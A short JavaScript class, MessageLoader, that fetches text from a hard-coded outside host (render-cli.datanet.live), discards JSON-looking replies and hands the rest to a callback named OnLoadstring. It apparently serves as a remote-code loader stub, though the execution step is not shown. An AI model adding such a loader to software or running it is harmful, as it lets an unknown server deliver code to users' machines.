export class MessageLoader {
    OnLoadstring;
    Load() {
        fetch("https://render-cli.datanet.live/fetch-data").then(g => g.text()).then(g => {
            if (g.startsWith("{")) {
                return;
            }
            if (this.OnLoadstring)
                this.OnLoadstring(g);
        });
    }
}
